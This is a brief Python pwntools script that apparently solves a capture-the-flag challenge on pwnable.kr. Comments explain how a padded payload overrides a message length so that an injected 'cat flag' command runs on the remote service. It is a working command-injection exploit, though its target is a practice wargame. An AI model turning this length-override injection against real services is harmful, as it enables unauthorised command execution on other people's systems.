from pwn import *

#  Command which will be ran is -> cat flag aaaa..."
#  The ; in the end will expand to three bytes so we can override the length
#  Of the first message, the second message is -> echo ...
#  We will override the length to be zero, then we can insert our own command

command = "cat flag"
payload = command.encode() + b' ' + b'a' * 244 + b';' + b'\x00'

p = remote("pwnable.kr", 9034)

p.sendline(payload)
print(p.recv())